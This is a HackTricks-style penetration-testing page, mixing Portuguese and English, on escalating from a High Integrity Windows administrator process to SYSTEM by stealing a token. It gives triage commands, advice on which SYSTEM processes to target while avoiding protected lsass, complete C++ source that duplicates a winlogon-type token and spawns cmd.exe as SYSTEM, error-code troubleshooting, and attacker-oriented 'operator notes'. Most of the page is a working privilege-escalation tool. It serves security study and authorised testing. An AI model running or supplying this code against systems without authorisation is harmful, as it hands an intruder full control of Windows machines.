# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Esta página é sobre a versão **manual** de passar de um **processo de administrador com High Integrity** para **`NT AUTHORITY\SYSTEM`** ao **abrir um processo SYSTEM não protegido, duplicar seu token e criar um processo filho com esse token**.

Se você só tem **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** mas **não consegue abrir um processo SYSTEM adequado**, o caminho de **Potato / named-pipe** geralmente é mais confiável:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Se o que você quer não é apenas `SYSTEM`, mas um **token SYSTEM com o maior número possível de privilégios**, veja também:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Antes de tentar roubar um token, valide rapidamente o contexto:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Practical notes:

- Um token de administrador com **High Integrity** geralmente é suficiente para **enable `SeDebugPrivilege`** e abrir muitos processos SYSTEM não protegidos.
- **`CreateProcessWithTokenW` requires `SeImpersonatePrivilege`** on the caller. If that API fails with `1314`, switch to `CreateProcessAsUserW` after you already duplicated a SYSTEM primary token.
- Em Windows modernos, **`lsass.exe` is often a bad target** porque **LSA protection / PPL** bloqueia o acesso até mesmo para administradores com `SeDebugPrivilege`. Prefira **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, ou um **`svchost.exe`** inicial rodando como SYSTEM.
- Nem todo processo SYSTEM tem um token igualmente útil. Se você conseguir SYSTEM mas notar privilégios ausentes, tente outro processo SYSTEM em vez de assumir que a technique está quebrada.

## Pick the PID carefully

The easiest way to make this work reliably is to **choose a SYSTEM process whose DACL actually allows Administrators to query the process and duplicate its token**.

Good candidates to test first:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- some early `svchost.exe` instances running as SYSTEM

Avoid by default:

- `lsass.exe` on hosts where **RunAsPPL / LSA protection** is enabled
- protected / security-sensitive processes that return `Access denied` even after enabling `SeDebugPrivilege`

Você pode inspecionar processos candidatos e seus tokens/ACLs com **Process Explorer** ou **Process Hacker** executando com privilégios elevados.

### Code

The following code from [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). It allows to **indicate a Process ID as argument** and a CMD **running as the user** of the indicated process will be run.\
Running in a High Integrity process you can **indicate the PID of a process running as System** (like `winlogon`, `wininit`) and execute a `cmd.exe` as SYSTEM.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Useful API / access-right notes

O exemplo usa `MAXIMUM_ALLOWED`, mas para operações reais é útil lembrar das partes mínimas envolvidas:

- `OpenProcessToken()` só requer que o **process handle** tenha sido aberto com **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Para usar `CreateProcessWithTokenW()`, o **primary token handle** deve ter **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- `DuplicateTokenEx()` deve criar um **primary token** (`TokenPrimary`), e não apenas um impersonation token.
- Se você já impersonou SYSTEM e `CreateProcessWithTokenW()` ainda falhar com `1314`, tente `CreateProcessAsUserW()` em vez disso.

Isso significa que **abrir o target process com `PROCESS_ALL_ACCESS` geralmente é desnecessário e mais ruidoso** do que apenas solicitar as permissões necessárias para consultar o token.

## Error

Em algumas ocasiões você pode tentar impersonate System e isso não vai funcionar, mostrando uma saída como a seguinte:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Isso significa que, mesmo se você estiver executando em um nível de High Integrity, **você não tem permissões suficientes** sobre esse target process/token.\
Vamos verificar as permissões atuais de Administrator sobre processos `svchost.exe` com **Process Explorer** (ou você também pode usar **Process Hacker**):

1. Selecione um processo de `svchost.exe`
2. Clique com o botão direito --> Properties
3. Dentro da aba "Security" clique no canto inferior direito no botão "Permissions"
4. Clique em "Advanced"
5. Selecione "Administrators" e clique em "Edit"
6. Clique em "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

A imagem anterior contém todos os privilégios que "Administrators" têm sobre o processo selecionado (como você pode ver, no caso de `svchost.exe` eles só têm privilégios de "Query")

Veja os privilégios que "Administrators" têm sobre `winlogon.exe`:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

Dentro desse processo, "Administrators" podem "Read Memory" e "Read Permissions", o que provavelmente permite que Administrators impersonate o token usado por esse processo.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: o DACL do processo bloqueia você, ou o target é **protected/PPL**. Escolha outro processo SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: seu token handle foi aberto sem permissões suficientes, ou o DACL do target token impede duplicação.
- **`CreateProcessWithTokenW()` -> `1314`**: o caller atualmente não tem **`SeImpersonatePrivilege`** habilitado. Tente habilitá-lo primeiro ou use `CreateProcessAsUserW()` com o duplicated primary token.
- **`CreateProcessWithTokenW()` -> `1326`** após falhas anteriores: isso geralmente significa apenas que a etapa anterior de duplicação/impersonation do token falhou, então não há um primary token utilizável para iniciar o child process.

## Operator notes

- Essa técnica é ótima quando você já é **local admin + high integrity** e só quer um caminho manual e rápido para SYSTEM sem subir um service ou uma cadeia de coerção com named-pipe.
- Em ambientes Windows 11 / Server hardened, **LSA protection** está cada vez mais comum, então um workflow que assume que `lsass.exe` sempre é legível é frágil. **`winlogon.exe` / `wininit.exe` / `services.exe` geralmente são melhores primeiras opções**.
- Se você cair em um contexto de **service account** em vez de um elevated admin desktop, a família **Potato** geralmente é uma opção melhor do que esta página.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
